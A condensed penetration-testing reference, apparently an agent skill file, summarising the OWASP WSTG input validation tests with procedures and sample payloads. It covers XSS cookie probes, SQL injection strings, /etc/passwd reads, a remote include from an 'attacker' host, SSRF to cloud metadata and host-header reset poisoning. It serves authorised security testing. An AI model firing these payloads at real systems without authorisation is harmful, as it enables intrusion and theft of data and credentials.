# 4.7 Input Validation Testing (WSTG-INPV)

Source: WSTG v4.2 §4.7 — the biggest category: every injection family plus HTTP-protocol abuse. Working rule from the guide: **one variable at a time, keep the rest constant**, and always record the baseline response before fuzzing so deltas are attributable.

## Test list

- **WSTG-INPV-01 — Reflected XSS.** Objective: find inputs echoed unencoded. Procedure: enumerate every user variable (params, hidden fields, radio/select values, headers); fire probes (`<script>alert(123)</script>`, `"><script>alert(document.cookie)</script>`); inspect the returned HTML for which special chars survive (`<>"'&` in HTML context; `\n \r ' " \ \uXXXX` in JS context); note the reflection context (HTML body, attribute, JS string, URL). Interpretation: unencoded reflection in an executable context = XSS; then build the context-correct payload (see xss-cheat-sheet skill).
- **WSTG-INPV-02 — Stored XSS.** Objective: find persisted input rendered dangerously. Procedure: map where input is stored then displayed — profiles, comments/forums, cart, uploads, settings, **logs viewed by admins**; inject context-aware payloads (break out of the attribute/tag you're stored into, e.g. `"> MALICIOUS CODE <!--`); include out-of-band input channels (support tickets, API fields) and admin-only views. Interpretation: stored payloads fire on every viewer — admin panels turn XSS into session theft of privileged users.
- **WSTG-INPV-03 — (merged into WSTG-CONF-06 HTTP methods — verb tampering lives there).**
- **WSTG-INPV-04 — HTTP parameter pollution.** Objective: exploit duplicate-param ambiguity. Procedure: duplicate params in query and body (`?color=red&color=blue`), combine GET+POST occurrences, and observe which wins — parsing differs by platform: ASP.NET/ASP concatenate with commas, PHP takes last, JSP/Tomcat takes first. Interpretation: use the mismatch to split payloads past WAF rules (`?page=select 1&page=2,3 from table`), poison the parameter a check reads while a different occurrence executes (the Blogger `blogID` takeover), or smuggle unvalidated values to the backend.
- **WSTG-INPV-05 — SQL injection.** Objective: alter SQL via input. Procedure: **detect** — `'`, `"`, `;`, comment delimiters, string-for-int, watch for DB error strings, 500s, content deltas (only one param varies); **exploit** — UNION (count columns via `ORDER BY n--`, type columns with `UNION SELECT 1,null,null`, then `UNION ALL SELECT` target data), boolean blind (`OR 1=1` vs `AND 1=2` content diffs), error-based (force DB errors carrying data — Oracle `UTL_INADDR.GET_HOST_NAME`), out-of-band (`UTL_HTTP.request` to your listener), time-delay (`AND IF(version() like '5%',sleep(10),'false')`), stacked/stored-procedure abuse. **Per-DBMS notes**: Oracle (dual-table functions, `||` concat), MySQL (`@@version`, `UNION` since 4.0), MSSQL (`;` stacked queries, `xp_cmdshell`), PostgreSQL (`LIMIT/OFFSET`, `::text` casts, `COPY` file write, `pg_sleep`), MS Access (no comments — use `NULL`), NoSQL (operator injection `{"$gt":""}`, JS `';return true;//`), ORM (property-path tricks), client-side (WebSQL). Interpretation: a tautology flip or single sleep-confirm proves injection — escalate to `version()`/`current_user` before touching data.
- **WSTG-INPV-06 — LDAP injection.** Objective: manipulate LDAP search filters. Procedure: inject filter metachars `( ) | & * ! =` — `user=*` widens `(cn=user)` to `(cn=*)`; on login filters craft always-true (`user=*)(uid=*))(|(uid=*`) to authenticate as the first LDAP user. Interpretation: filter control = unauthorized data access, restriction bypass, or object modification.
- **WSTG-INPV-07 — XML injection.** Objective: inject XML structure or metachars. Procedure: probe for XML-building backends — inject metacharacters to map structure, then tag-inject (e.g., craft a registration value that closes tags and adds nodes/attributes); also test XInclude/DTD entity paths where XML is parsed (XXE-adjacent). Interpretation: injected nodes that alter stored documents = data integrity breach.
- **WSTG-INPV-08 — SSI injection.** Objective: execute server-side include directives. Procedure: confirm SSI support (`.shtml` pages, server fingerprint, config access); inject directives via any stored/reflected input — `<!--#echo var="VAR" -->` to confirm, `<!--#include virtual="FILE" -->` for file read/dir listing, `<!--#exec cmd="OS_COMMAND" -->` for RCE (often disabled); headers/cookies count as vectors too. Interpretation: echoed directive output = SSI injection; `exec` = command execution on the web server.
- **WSTG-INPV-09 — XPath injection.** Objective: manipulate XPath queries on XML backends. Procedure: mirror SQLi — tautology `' or '1'='1` on login-style XPath (`//user[username='' or '1'='1' and password='' or '1'='1']`), then blind-extract node values char-by-char. Interpretation: XPath has no ACL concept — a successful injection reads the *whole* XML document, not just permitted fields.
- **WSTG-INPV-10 — IMAP/SMTP injection.** Objective: inject mail-protocol commands through webmail-style apps. Procedure: hit params bound for mail servers (mailbox, addresses, subject, body, attachments) — null values, bogus values (`mailbox=NOTEXIST`), extra params (`INBOX PARAMETER2`), CRLF to append raw IMAP/SMTP commands; watch for 200 vs error responses distinguishing backend handling. Interpretation: command injection reaches an internal mail server that isn't Internet-exposed — relay/spam, mailbox ops, or vuln exploitation on an unhardened backend.
- **WSTG-INPV-11 — Code injection (incl. LFI/RFI subsections).** Objective: get input evaluated as code or included as a file. Procedure: identify params reaching eval/include — inject script code (PHP/ASP execution functions), or file paths: **LFI** — `?file=../../../../etc/passwd`, wrappers (`php://filter/convert.base64-encode/resource=index.php` to read source, `php://input`, `data://`, `expect://`), log/session-file poisoning + include for RCE, null byte/encoding to beat suffix enforcement; **RFI** — `?file=http://attacker/malicious_page` when remote includes allowed. Interpretation: file content or remote payload executed = inclusion; wrappers bypass "source can't be read" assumptions.
- **WSTG-INPV-12 — Command injection.** Objective: run OS commands via input. Procedure: inject shell metachars into params reaching system calls — `;`, `|`, `&&`, `` ` `` , `$()`, newlines (e.g. `?doc=/bin/ls|`, `?dir=%3Bcat%20/etc/passwd`, `Doc=Doc1.pdf+|+Dir c:\`); watch output embedded in responses, or use timing (`; sleep 10`) and OOB callbacks for blind cases. Interpretation: command output in response or a measurable side effect = RCE — prove with a benign command (`id`, `ls`, `dir`).
- **WSTG-INPV-13 — Format string injection.** Objective: abuse input passed to `printf`-family calls. Procedure: inject conversion specifiers `%x %s %n %p` into params — `%x%x%x` dumps stack memory (info disclosure), `%n` writes memory in C/Perl-family code (worst case: code exec), extra specifiers crash runtime in Java/PHP. Interpretation: hex dumps or crashes after format specifiers confirm the input reached a format function un-sanitized.
- **WSTG-INPV-14 — Incubated vulnerabilities.** Objective: plant payloads that detonate later elsewhere. Procedure: needs two weaknesses — persistence (store a vector via upload, forum post, SQLi write, admin console) + a later execution path (weak output validation when the data is recalled); think watering-hole — uploaded exploit media, stored script in a backend repo rendered to admins, content written via injection that pages later serve. Interpretation: set a listener for the recall step (cookie-reporting image, OOB hit) — impact is measured by *who* triggers the recall (all users vs admins).
- **WSTG-INPV-15 — HTTP splitting / smuggling.** Objective: poison response structure or desync parsers. Procedure: **splitting** — inject `%0d%0a` into input reflected into response headers (redirect `Location`, Set-Cookie) to fabricate a second response → cache poisoning/XSS; **smuggling** (gray-box) — craft ambiguous `Content-Length` vs `Transfer-Encoding` combos so front-end and back-end disagree on message boundaries. Interpretation: injected CRLF producing a controllable second response = splitting; parser desync = smuggled requests hitting other users/queues.
- **WSTG-INPV-16 — HTTP incoming requests monitoring.** Objective: watch server-side HTTP when you can't proxy the client. Procedure: stand up a reverse proxy on the server end (Fiddler on Windows, Charles on Linux) or port-forward (Charles as SOCKS) to capture all inbound requests; for deeper capture use tcpdump/Wireshark and replay/edit PCAP with Ostinato (note: HTTPS needs the server key to inspect). Interpretation: monitoring without client changes reveals background/suspicious requests invisible in browser testing.
- **WSTG-INPV-17 — Host header injection.** Objective: abuse unvalidated `Host`. Procedure: swap Host to an attacker domain — watch for 302 to it, dispatch to first vhost; try `X-Forwarded-Host` when Host is filtered; test cache poisoning (injected host appearing in generated links, then cached for everyone); **password-reset poisoning** — if reset links embed Host, a poisoned Host sends the token link to your domain. Interpretation: any attacker domain surfacing in links/redirects/resets = exploitable trust in Host.
- **WSTG-INPV-18 — Server-side template injection.** Objective: get input evaluated by the template engine. Procedure: **plaintext context** — probe with engine expressions `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `a{{bar}}b` and watch for evaluated output (`49`); **code context** — break out of template statements (`personal_greeting=username}}<tag>`); identify the engine (Jinja2, Twig, FreeMarker…) from error messages and probe syntax, then build engine-specific escalation to RCE. Interpretation: arithmetic evaluated = SSTI; engine identification drives the exploit idiom.
- **WSTG-INPV-19 — Server-side request forgery.** Objective: make the server fetch attacker-chosen targets. Procedure: find params taking URLs/files (`?page=`, webhooks, importers, PDF generators); try remote URL (`?page=https://attacker/shell`), internal services (`http://localhost/admin`, `127.0.0.1`), file scheme (`file:///etc/passwd`), cloud metadata (`169.254.169.254`); blind SSRF via OOB callback or injected `<iframe src="file:///…">`/`<img>`/CSS `url()` in PDF-generating uploads; bypass filters with alt IP forms (`2130706433`, `0177.1`, `127.1`), `https://expected@attacker`, `https://attacker#expected`, URL-encoding, DNS-to-local domains. Interpretation: trust relationships make internal-only surfaces reachable — port-mapping internal services or reading metadata is high impact.

## Common findings

Reflected/stored XSS in search, profiles, admin log viewers; error-based and time-blind SQLi on `id` params; `ORDER BY` and sort fields; LFI in file viewers/downloaders; `{{7*7}}`→49 in marketing/CMS features; SSRF in URL-fetchers, PDF generators, webhooks; CRLF splitting in redirect params; reset-token theft via `X-Forwarded-Host`.

## Escalation notes

SQLi → `version()`/`current_user` proof → schema walk → auth bypass or file write (`INTO OUTFILE`, Postgres `COPY`); command injection → reverse access or data read — minimal PoC only; SSRF → cloud metadata → role keys → broader compromise; stored XSS → session theft (SESS-02) or admin action via CSRF-bypass (SESS-05); HPP/smuggling → WAF and cache poisoning → mass XSS delivery.
